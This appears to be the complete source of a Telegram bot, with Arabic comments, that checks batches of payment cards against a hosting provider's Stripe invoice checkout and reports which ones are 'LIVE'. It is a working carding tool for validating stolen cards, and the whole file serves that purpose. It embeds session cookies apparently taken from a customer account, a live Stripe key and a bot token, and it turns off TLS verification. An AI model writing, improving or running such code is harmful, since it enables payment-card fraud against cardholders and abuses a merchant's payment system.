#pylint:disable=W0603
#pylint:disable=W0611
import telebot
from telebot import types
import requests
import re
from bs4 import BeautifulSoup
import urllib3
import time
import threading
import traceback
import logging

# إعداد نظام التسجيل
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# إخفاء تحذيرات SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TOKEN = "8334507568:AAHp9fsFTOigfWKGBnpiThKqrDast5y-4cU"
ADMIN_ID = 5895491379
INVOICE_ID = 260528

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# تخزين البيانات
user_cards = {}
checking_status = {}
user_results = {}

class StripeChecker:
    def __init__(self):
        self.cookies = {
        '_gcl_au': '1.1.1086970495.1761294272',
        '_ga': 'GA1.1.1641871625.1761294273',
        '__stripe_mid': '0204b226-bf2c-4c98-83eb-5fa3551541ec16ac02',
        'inputNotes': '',
        'inputHowDidYouFind': '',
        'howDidRewards': '',
        'WHMCSqCgI4rzA0cru': 'go71bn8nc22avq11bk86rfcmon',
        'WHMCSlogin_auth_tk': 'R1BSNk1nZlBUYTZ0SzM2Z216Wm5wcVNlaUs1Y1BPRUk2RU54b0xJdVdtRzJyNUY4Uk9EajVLL0ZXTHUwRkRyNk44QWhvVHpVOHBKbTQwVE92UmxUTDlXaUR1SWJvQ3hnN3RONEl3VXFONWN1VEZOSFEycEtkMGlZZVRvZWZtbkZIbjlZTjI0NmNLbC9XbWJ4clliYllJejV4YThKTC9RMWZveld3Tm1UMHMxT3daalcrd296c1QxTVk1M3BTSHR0SzJhcmo4Z3hDSWZvVGx6QUZkV3E1QnFDbndHcEg4MXJrSGdwcnQ3WElwYWZnbkZBRVNoRnFvYnhOdE84WU1vd09sVUd0cjd4akJjdW54REVGVUNJcXNrQk5OMU50eWJWS3JMY1AwTm5LbmZHbmMwdEdMdTU3TDZ6cytWOERoczlRZ3BYbmNQaEJ5bUpYcnI3emd1OXhnZGxJVTV0TWV6dnRPRmxESjdDV1QxSWNZeFowMDFGcXlKelBmTXVQK0JuZkNsZHR5R2orNittMGNHeTF2V2tPWUtwUHVKNWxrZVVaSnFzUUE9PQ%3D%3D',
        'VsysFirstVisit': '1761307789',
        '_ga_248YG9EFT7': 'GS2.1.s1761307804$o4$g1$t1761309800$j37$l0$h2017258656',
        }
        self.invoice_id = INVOICE_ID
        logger.info(f"✅ StripeChecker initialized with Invoice ID: {INVOICE_ID}")
    
    def fetch_invoice_data(self):
        """جلب بيانات الفاتورة والكوكيز من vsys.host"""
        try:
            logger.info(f"🔄 Fetching invoice data for ID: {self.invoice_id}")
            url = f"https://vsys.host/viewinvoice.php?id={self.invoice_id}"
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            }
            
            session = requests.Session()
            response = session.get(url, headers=headers, cookies=self.cookies, timeout=20, verify=False)
            logger.info(f"📡 Response Status: {response.status_code}")
            
            response.raise_for_status()
            
            new_cookies = session.cookies.get_dict()
            stripe_mid = new_cookies.get('__stripe_mid', '0204b226-bf2c-4c98-83eb-5fa3551541ec16ac02')
            stripe_sid = new_cookies.get('__stripe_sid', '2a9c20ed-7d36-46e6-9b81-95addca2ce147b8f82')
            logger.info(f"🍪 Cookies retrieved: MID={stripe_mid[:20]}..., SID={stripe_sid[:20]}...")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # البحث عن session_id
            m = re.search(r'https://checkout\.stripe\.com/[^\s\'"]+', response.text, flags=re.IGNORECASE)
            if m and '/pay/' in m.group(0):
                session_id = m.group(0).split('/pay/')[1].split('#')[0]
                logger.info(f"🔑 Session ID found: {session_id[:30]}...")
            else:
                logger.error("❌ Session ID not found in response")
                return None, None, None, None, "❌ لم يتم العثور على رابط الدفع في الفاتورة"
            
            # البحث عن المبلغ
            total_row = soup.find('tr', class_='total-row')
            if not total_row:
                total_row = soup.select_one('tr:contains("Total")')
            
            if not total_row:
                logger.error("❌ Total amount row not found")
                return None, None, None, None, "❌ لم يتم العثور على المبلغ الإجمالي"
            
            total_cells = total_row.find_all('td')
            if len(total_cells) < 2:
                logger.error("❌ Total amount cells not found")
                return None, None, None, None, "❌ تنسيق المبلغ غير صحيح"
            
            total_amount_text = total_cells[1].text.replace('$', '').strip()
            total_amount = int(float(total_amount_text) * 100)
            logger.info(f"💰 Total amount: ${total_amount_text} = {total_amount} cents")
            
            if not session_id or not total_amount:
                logger.error("❌ Missing session_id or total_amount")
                return None, None, None, None, "❌ فشل جلب بيانات الدفع"
            
            logger.info("✅ Invoice data fetched successfully")
            return session_id, total_amount, stripe_mid, stripe_sid, None
            
        except requests.exceptions.Timeout:
            error_msg = "⏱️ انتهت مهلة الاتصال بالموقع"
            logger.error(f"TIMEOUT ERROR: {error_msg}")
            return None, None, None, None, error_msg
        except requests.exceptions.ConnectionError as e:
            error_msg = f"🌐 خطأ في الاتصال بالإنترنت: {str(e)[:100]}"
            logger.error(f"CONNECTION ERROR: {error_msg}")
            return None, None, None, None, error_msg
        except Exception as e:
            error_msg = f"❌ خطأ غير متوقع: {str(e)[:100]}"
            logger.error(f"FETCH ERROR: {error_msg}")
            logger.error(f"Full traceback: {traceback.format_exc()}")
            return None, None, None, None, error_msg
    
    def check_card(self, card_details):
        """فحص بطاقة واحدة"""
        start_time = time.time()
        logger.info(f"🔍 Starting check for card: {card_details[:20]}...")
        
        try:
            # التحقق من صيغة البطاقة
            parts = card_details.strip().split('|')
            if len(parts) != 4:
                error_msg = f'❌ صيغة خاطئة - المطلوب: رقم|شهر|سنة|cvv (وجدت {len(parts)} أجزاء)'
                logger.error(f"FORMAT ERROR: {error_msg}")
                return {
                    'status': 'ERROR',
                    'message': error_msg,
                    'details': {'error_type': 'format_error'},
                    'time': 0
                }
            
            card_number, exp_month, exp_year, cvc = [p.strip() for p in parts]
            logger.info(f"💳 Card parsed: {card_number[:6]}...{card_number[-4:]}")
            
            # جلب بيانات الفاتورة
            session_id, total_amount, stripe_mid, stripe_sid, error = self.fetch_invoice_data()
            
            if error:
                logger.error(f"INVOICE ERROR: {error}")
                return {
                    'status': 'ERROR',
                    'message': error,
                    'details': {'error_type': 'invoice_error'},
                    'time': round(time.time() - start_time, 2)
                }
            
            headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://checkout.stripe.com',
                'referer': 'https://checkout.stripe.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; x64) AppleWebKit/537.36',
            }

            # إنشاء طريقة دفع
            logger.info("🔄 Creating payment method...")
            data_pm = (
                f'type=card&card[number]={card_number}&card[cvc]={cvc}&'
                f'card[exp_month]={exp_month}&card[exp_year]={exp_year}&'
                'billing_details[name]=Card+details+saad&'
                'billing_details[email]=renes98352%40neuraxo.com&'
                'billing_details[address][country]=IT&'
                f'guid=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&'
                f'muid={stripe_mid}&sid={stripe_sid}&'
                'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
            )

            r1 = requests.post('https://api.stripe.com/v1/payment_methods', 
                             headers=headers, data=data_pm, timeout=20)
            logger.info(f"📡 Payment method response status: {r1.status_code}")
            
            pm_res = r1.json()
            logger.info(f"📄 Payment method response: {str(pm_res)[:200]}...")
            
            if 'id' not in pm_res:
                if 'error' in pm_res:
                    error_info = pm_res['error']
                    error_msg = error_info.get('message', 'خطأ غير معروف')
                    error_code = error_info.get('code', 'unknown')
                    logger.error(f"STRIPE ERROR: {error_code} - {error_msg}")
                    return {
                        'status': 'DECLINED',
                        'message': f"❌ {error_msg}",
                        'details': {'error_type': 'stripe_error', 'code': error_code},
                        'time': round(time.time() - start_time, 2)
                    }
                else:
                    logger.error("UNKNOWN ERROR: No payment method ID")
                    return {
                        'status': 'ERROR',
                        'message': '❌ فشل إنشاء طريقة الدفع',
                        'details': {'error_type': 'pm_creation_failed'},
                        'time': round(time.time() - start_time, 2)
                    }

            pm_id = pm_res['id']
            logger.info(f"✅ Payment method created: {pm_id}")
            
            # تأكيد الدفع
            logger.info("🔄 Confirming payment...")
            data_confirm = (
                f'eid=NA&payment_method={pm_id}&expected_amount={total_amount}&'
                f'last_displayed_line_item_group_details[subtotal]={total_amount}&'
                'last_displayed_line_item_group_details[total_exclusive_tax]=0&'
                f'guid=ebb2db58-111a-499c-b05b-ccd6bd7f4ed77d3fd8&'
                f'muid={stripe_mid}&sid={stripe_sid}&'
                'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
            )

            r2 = requests.post(
                f'https://api.stripe.com/v1/payment_pages/{session_id}/confirm',
                headers=headers, data=data_confirm, timeout=20
            )
            logger.info(f"📡 Confirm response status: {r2.status_code}")
            
            confirm_res = r2.json()
            logger.info(f"📄 Confirm response: {str(confirm_res)[:200]}...")
            
            if 'payment_intent' not in confirm_res:
                logger.warning("⚠️ No payment_intent in response")
                if 'error' in confirm_res:
                    error_msg = confirm_res['error'].get('message', 'خطأ في التأكيد')
                    logger.error(f"CONFIRM ERROR: {error_msg}")
                    return {
                        'status': 'ERROR',
                        'message': f'❌ {error_msg}',
                        'details': {'error_type': 'confirm_error'},
                        'time': round(time.time() - start_time, 2)
                    }
                return {
                    'status': 'ERROR',
                    'message': '⚠️ لا يوجد payment_intent في الاستجابة',
                    'details': {'error_type': 'no_payment_intent'},
                    'time': round(time.time() - start_time, 2)
                }
            
            pi = confirm_res['payment_intent']
            status = pi.get('status', 'unknown')
            logger.info(f"📊 Payment intent status: {status}")
            
            if status == 'requires_action':
                logger.info("🔐 3DS authentication required")
                next_action = pi.get('next_action', {})
                if next_action.get('type') == 'use_stripe_sdk':
                    use_stripe_sdk = next_action.get('use_stripe_sdk', {})
                    source_id = use_stripe_sdk.get('three_d_secure_2_source')
                    
                    if not source_id:
                        logger.error("❌ No 3DS source found")
                        return {
                            'status': 'ERROR',
                            'message': '❌ لا يوجد 3DS source',
                            'details': {'error_type': 'no_3ds_source'},
                            'time': round(time.time() - start_time, 2)
                        }
                    
                    logger.info(f"🔐 Authenticating 3DS: {source_id[:30]}...")
                    data_3ds = (
                        f'source={source_id}&'
                        'browser=%7B%22threeDSCompInd%22%3A%22Y%22%7D&'
                        'key=pk_live_51GkRAEGiP3Mqp3aOunbt41L2O6DAAHnCW6DdpPPMIHOdPcYKBewOAP8MgyYRitVPmsiv8QggjFDDsQ16Xtr4SBPW00hdKd4Xgd'
                    )
                    
                    r3 = requests.post('https://api.stripe.com/v1/3ds2/authenticate', 
                                     headers=headers, data=data_3ds, timeout=20)
                    logger.info(f"📡 3DS response status: {r3.status_code}")
                    
                    tds_res = r3.json()
                    logger.info(f"📄 3DS response: {str(tds_res)[:200]}...")
                    
                    ares = tds_res.get('ares', {})
                    trans_status = ares.get('transStatus', '?')
                    logger.info(f"📊 3DS transStatus: {trans_status}")
                    
                    status_map = {
                        'N': ('LIVE', '✅ Live - transStatus: N'),
                        'Y': ('APPROVED', '✅ Approved - transStatus: Y'),
                        'R': ('DECLINED', '❌ Rejected - transStatus: R'),
                        'C': ('OTP', '🔐 Challenge - transStatus: C')
                    }
                    
                    result_status, message = status_map.get(trans_status, ('ERROR', f'ℹ️ transStatus: {trans_status}'))
                    logger.info(f"✅ Final result: {result_status} - {message}")
                    return {
                        'status': result_status,
                        'message': message,
                        'details': {'trans_status': trans_status},
                        'time': round(time.time() - start_time, 2)
                    }
            
            elif status == 'succeeded':
                logger.info("✅ Payment succeeded directly")
                return {
                    'status': 'LIVE',
                    'message': '✅ Approved Direct',
                    'details': {},
                    'time': round(time.time() - start_time, 2)
                }
            else:
                error = pi.get('last_payment_error', {})
                if error:
                    msg = error.get('message', error.get('code', status))
                    logger.error(f"PAYMENT ERROR: {msg}")
                else:
                    msg = f"Status: {status}"
                    logger.error(f"UNKNOWN STATUS: {msg}")
                
                return {
                    'status': 'DECLINED',
                    'message': f"❌ {msg}",
                    'details': {'payment_status': status},
                    'time': round(time.time() - start_time, 2)
                }

        except requests.exceptions.Timeout:
            error_msg = "⏱️ انتهت مهلة الاتصال"
            logger.error(f"TIMEOUT: {error_msg}")
            return {
                'status': 'ERROR',
                'message': error_msg,
                'details': {'error_type': 'timeout'},
                'time': round(time.time() - start_time, 2)
            }
        except requests.exceptions.RequestException as e:
            error_msg = f"🌐 خطأ في الطلب: {str(e)[:100]}"
            logger.error(f"REQUEST ERROR: {error_msg}")
            logger.error(f"Full traceback: {traceback.format_exc()}")
            return {
                'status': 'ERROR',
                'message': error_msg,
                'details': {'error_type': 'request_error'},
                'time': round(time.time() - start_time, 2)
            }
        except Exception as e:
            error_msg = f"❌ خطأ غير متوقع: {str(e)[:100]}"
            logger.error(f"UNEXPECTED ERROR: {error_msg}")
            logger.error(f"Full traceback: {traceback.format_exc()}")
            return {
                'status': 'ERROR',
                'message': error_msg,
                'details': {'error_type': 'unexpected', 'exception': str(e)},
                'time': round(time.time() - start_time, 2)
            }

# Bot Handlers
@bot.message_handler(commands=['start'])
def start_message(message):
    try:
        username = message.from_user.first_name or "User"
        logger.info(f"👤 User {username} (ID: {message.from_user.id}) started bot")
        welcome_text = f"""<b>🎉 Welcome {username}!

🔥 Stripe Card Checker Bot 🔥
━━━━━━━━━━━━━━━━━━━━
✅ Fast & Accurate Checking
📊 Real-time Results  
🔒 Secure Processing
💳 Only LIVE Cards Sent

📤 Send your combo file to start checking!
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
        bot.send_message(message.chat.id, welcome_text)
    except Exception as e:
        logger.error(f"START ERROR: {str(e)}")
        logger.error(f"Full traceback: {traceback.format_exc()}")

@bot.message_handler(content_types=["document"])
def handle_document(message):
    user_id = message.from_user.id
    try:
        logger.info(f"📁 User {user_id} uploaded document: {message.document.file_name}")
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        lines = downloaded_file.decode("utf-8").splitlines()
        logger.info(f"📄 File contains {len(lines)} lines")
        
        cards = []
        for i, line in enumerate(lines, 1):
            line = line.strip()
            if '|' in line:
                parts = line.split('|')
                if len(parts) == 4:
                    cards.append(line)
                else:
                    logger.warning(f"⚠️ Line {i} has invalid format: {line[:50]}")
        
        logger.info(f"✅ Extracted {len(cards)} valid cards")
        
        if not cards:
            bot.reply_to(message, "❌ No valid cards found in file!\nFormat: Card|MM|YYYY|CVV")
            return
        
        user_cards[user_id] = cards
        checking_status[user_id] = False
        user_results[user_id] = []
        
        cc_count = len(cards)
        keyboard = types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
        
        bot.send_message(
            chat_id=message.chat.id,
            text=f"""<b>✅ File Uploaded Successfully!
━━━━━━━━━━━━━━━━━━━━
💳 Total Cards: {cc_count}
🔥 Gateway: Stripe 3DS
⚡ Status: Ready

Click below to start checking:
</b>""",
            reply_markup=keyboard
        )
    except Exception as e:
        error_msg = f"❌ Error processing file: {str(e)}"
        logger.error(f"DOCUMENT ERROR: {error_msg}")
        logger.error(f"Full traceback: {traceback.format_exc()}")
        bot.reply_to(message, error_msg)

@bot.callback_query_handler(func=lambda call: call.data == 'start_check')
def start_checking(call):
    user_id = call.from_user.id
    
    try:
        if user_id not in user_cards or not user_cards[user_id]:
            bot.answer_callback_query(call.id, "❌ No cards loaded!")
            return
        
        if checking_status.get(user_id, False):
            bot.answer_callback_query(call.id, "⚠️ Already checking!")
            return
        
        checking_status[user_id] = True
        bot.answer_callback_query(call.id, "✅ Starting check...")
        logger.info(f"🚀 User {user_id} started checking {len(user_cards[user_id])} cards")
        
        thread = threading.Thread(target=check_cards_thread, args=(user_id, call.message))
        thread.daemon = True
        thread.start()
    except Exception as e:
        logger.error(f"START CHECK ERROR: {str(e)}")
        logger.error(f"Full traceback: {traceback.format_exc()}")
        bot.answer_callback_query(call.id, f"❌ Error: {str(e)[:100]}")

def check_cards_thread(user_id, message):
    cards = user_cards[user_id]
    total = len(cards)
    
    try:
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=message.message_id,
            text="⏳ Initializing checker...\n🔑 Getting session data..."
        )
        
        checker = StripeChecker()
        live = approved = otp = declined = errors = checked = 0
        start_time = time.time()
        
        for card in cards:
            if not checking_status.get(user_id, True):
                logger.info(f"⏹️ User {user_id} stopped checking")
                break
            
            checked += 1
            logger.info(f"🔄 Checking card {checked}/{total}")
            result = checker.check_card(card)
            user_results[user_id].append({'card': card, 'result': result})
            
            # إنشاء لوحة التحكم
            keyboard = types.InlineKeyboardMarkup(row_width=1)
            keyboard.add(
                types.InlineKeyboardButton(f"• LIVE ✅ ➜ [{live}] •", callback_data='x'),
                types.InlineKeyboardButton(f"• Approved ✔ ➜ [{approved}] •", callback_data='x'),
                types.InlineKeyboardButton(f"• OTP 🔐 ➜ [{otp}] •", callback_data='x'),
                types.InlineKeyboardButton(f"• Declined ❌ ➜ [{declined}] •", callback_data='x'),
                types.InlineKeyboardButton(f"• Errors ⚠️ ➜ [{errors}] •", callback_data='x'),
                types.InlineKeyboardButton(f"• Total ➜ [{checked}/{total}] •", callback_data='x'),
                types.InlineKeyboardButton("⏹ Stop", callback_data='stop_check')
            )
            
            if result['status'] == 'LIVE':
                live += 1
                msg = f"""<b>✅ LIVE CARD
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card}</code>
📊 Response: {result['message']}
⏱ Time: {result['time']} sec
━━━━━━━━━━━━━━━━━━━━
👨‍💻 By: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
                bot.send_message(user_id, msg)
            elif result['status'] == 'APPROVED':
                approved += 1
            elif result['status'] == 'OTP':
                otp += 1
            elif result['status'] == 'DECLINED':
                declined += 1
            else:
                errors += 1
                # إرسال تفاصيل الخطأ للمستخدم
                error_details = result.get('details', {})
                error_type = error_details.get('error_type', 'unknown')
                error_msg = f"""<b>⚠️ ERROR DETECTED
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{card[:20]}...</code>
❌ Error: {result['message']}
🔍 Type: {error_type}
⏱ Time: {result['time']} sec
━━━━━━━━━━━━━━━━━━━━
</b>"""
                bot.send_message(user_id, error_msg)
            
            # عرض التقدم
            progress = int((checked / total) * 20)
            progress_bar = f"[{'█' * progress}{'░' * (20 - progress)}] {int((checked / total) * 100)}%"
            elapsed = time.time() - start_time
            speed = checked / elapsed if elapsed > 0 else 0
            eta = (total - checked) / speed if speed > 0 else 0
            
            card_parts = card.split('|')
            card_display = f"{card_parts[0][:6]}...{card_parts[0][-4:]}" if len(card_parts[0]) >= 10 else card_parts[0]
            
            try:
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=message.message_id,
                    text=f"""<b>🔥 Gateway: Stripe 3DS
━━━━━━━━━━━━━━━━━━━━
⏳ Checking in progress...
{progress_bar}
⏱ ETA: {int(eta)}s | Speed: {speed:.1f} cps
💳 Current: {card_display}
</b>""",
                    reply_markup=keyboard
                )
            except Exception as e:
                logger.error(f"UPDATE MESSAGE ERROR: {str(e)}")
            
            time.sleep(5)  # تأخير 5 ثواني بين كل بطاقة
        
        # النتيجة النهائية
        total_time = time.time() - start_time
        logger.info(f"✅ Checking completed for user {user_id}: {live} live, {approved} approved, {otp} otp, {declined} declined, {errors} errors")
        
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=message.message_id,
            text=f"""<b>✅ CHECKING COMPLETED!
━━━━━━━━━━━━━━━━━━━━
📊 Results Summary:
├ Total Cards: {total}
├ LIVE ✅: {live}
├ Approved ✔: {approved}
├ OTP 🔐: {otp}
├ Declined ❌: {declined}
├ Errors ⚠️: {errors}

⏱ Stats:
├ Time: {int(total_time)}s
└ Speed: {(total/total_time):.2f} cards/sec
━━━━━━━━━━━━━━━━━━━━
🎉 Thank you for using the bot!
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
        )
        
        checking_status[user_id] = False
        del user_cards[user_id]
        
    except Exception as e:
        error_msg = f"❌ Critical error in checking thread: {str(e)}"
        logger.error(f"THREAD ERROR: {error_msg}")
        logger.error(f"Full traceback: {traceback.format_exc()}")
        try:
            bot.send_message(
                user_id,
                f"""<b>❌ CRITICAL ERROR
━━━━━━━━━━━━━━━━━━━━
{error_msg}

Please contact admin or try again later.
━━━━━━━━━━━━━━━━━━━━
</b>"""
            )
        except:
            pass
        checking_status[user_id] = False

@bot.callback_query_handler(func=lambda call: call.data == 'stop_check')
def stop_checking(call):
    try:
        user_id = call.from_user.id
        checking_status[user_id] = False
        logger.info(f"⏹️ User {user_id} stopped checking")
        bot.answer_callback_query(call.id, "✅ Checking stopped!")
    except Exception as e:
        logger.error(f"STOP ERROR: {str(e)}")
        bot.answer_callback_query(call.id, f"❌ Error: {str(e)[:50]}")

@bot.callback_query_handler(func=lambda call: call.data == 'x')
def dummy_handler(call):
    bot.answer_callback_query(call.id, "📊 Live Status")

@bot.message_handler(commands=['help'])
def help_message(message):
    try:
        help_text = """<b>📚 Bot Commands & Usage:
━━━━━━━━━━━━━━━━━━━━
/start - Start the bot
/help - Show this message
/status - Check bot status
/logs - Show error logs (Admin only)

📤 How to use:
1. Send a combo file (.txt)
2. Click "Start Checking"
3. Only LIVE cards sent
4. Errors displayed with details

📝 Combo Format:
Card|MM|YYYY|CVV

Example:
5127740080852575|03|2027|825
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
        bot.send_message(message.chat.id, help_text)
    except Exception as e:
        logger.error(f"HELP ERROR: {str(e)}")

@bot.message_handler(commands=['status'])
def status_message(message):
    try:
        status_text = """<b>🟢 Bot Status: ONLINE
━━━━━━━━━━━━━━━━━━━━
⚡ Gateway: Stripe 3DS
🔥 Speed: Fast (5s delay)
✅ Accuracy: High
🌐 Server: Active
🔧 Invoice ID: {INVOICE_ID}
━━━━━━━━━━━━━━━━━━━━
👨‍💻 Developer: <a href='https://t.me/YourChannel'>A3S Team 🥷🏻</a>
</b>"""
        bot.send_message(message.chat.id, status_text)
    except Exception as e:
        logger.error(f"STATUS ERROR: {str(e)}")

@bot.message_handler(commands=['logs'])
def logs_message(message):
    try:
        if message.from_user.id != ADMIN_ID:
            bot.reply_to(message, "❌ Admin only command!")
            return
        
        # إرسال آخر الأخطاء المسجلة
        bot.send_message(
            message.chat.id,
            f"""<b>📋 Bot Logs
━━━━━━━━━━━━━━━━━━━━
Check console for detailed logs.
All errors are logged with full traceback.
━━━━━━━━━━━━━━━━━━━━
Active users: {len(user_cards)}
Checking now: {sum(1 for v in checking_status.values() if v)}
</b>"""
        )
    except Exception as e:
        logger.error(f"LOGS ERROR: {str(e)}")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    try:
        text = message.text.strip()
        logger.info(f"📝 User {message.from_user.id} sent text: {text[:50]}")
        
        if '|' in text and len(text.split('|')) == 4:
            user_cards[message.from_user.id] = [text]
            checking_status[message.from_user.id] = False
            user_results[message.from_user.id] = []
            
            keyboard = types.InlineKeyboardMarkup(row_width=2)
            keyboard.add(types.InlineKeyboardButton("🚀 Start Checking", callback_data='start_check'))
            
            parts = text.split('|')
            bot.send_message(
                chat_id=message.chat.id,
                text=f"""<b>✅ Card Loaded!
━━━━━━━━━━━━━━━━━━━━
💳 Card: <code>{parts[0][:6]}...{parts[0][-4:]}</code>
🔥 Gateway: Stripe 3DS
⚡ Status: Ready
</b>""",
                reply_markup=keyboard
            )
        else:
            bot.reply_to(message, """<b>❌ Invalid format!
Use: Card|MM|YYYY|CVV

Example: 5127740080852575|03|2027|825

Or send a .txt file with multiple cards.
</b>""")
    except Exception as e:
        error_msg = f"❌ Error processing text: {str(e)}"
        logger.error(f"TEXT HANDLER ERROR: {error_msg}")
        logger.error(f"Full traceback: {traceback.format_exc()}")
        bot.reply_to(message, error_msg)

# معالج الأخطاء العام
def error_handler(func):
    def wrapper(*args, **kwargs):
        try:
            return func(*args, **kwargs)
        except Exception as e:
            logger.error(f"HANDLER ERROR in {func.__name__}: {str(e)}")
            logger.error(f"Full traceback: {traceback.format_exc()}")
            try:
                if args and hasattr(args[0], 'chat'):
                    bot.send_message(
                        args[0].chat.id,
                        f"<b>❌ خطأ: {str(e)[:200]}\n\nالرجاء المحاولة مرة أخرى أو التواصل مع المطور.</b>"
                    )
            except:
                pass
    return wrapper

if __name__ == "__main__":
    try:
        print("=" * 50)
        print("🚀 Starting Stripe Checker Bot...")
        print(f"👤 Admin ID: {ADMIN_ID}")
        print(f"🧾 Invoice ID: {INVOICE_ID}")
        print(f"🔑 Token: {TOKEN[:20]}...")
        print("=" * 50)
        logger.info("✅ Bot started successfully")
        print("\n✅ Bot is running and ready to accept requests...\n")
        print("📋 All errors will be displayed below with full details:\n")
        bot.polling(none_stop=True, interval=0, timeout=60)
    except KeyboardInterrupt:
        logger.info("⏹️ Bot stopped by user")
        print("\n⏹️ Bot stopped by user")
    except Exception as e:
        error_msg = f"❌ CRITICAL BOT ERROR: {str(e)}"
        logger.error(error_msg)
        logger.error(f"Full traceback: {traceback.format_exc()}")
        print(f"\n{error_msg}")
        print("\n" + "=" * 50)
        print("Full Error Details:")
        print("=" * 50)
        traceback.print_exc()
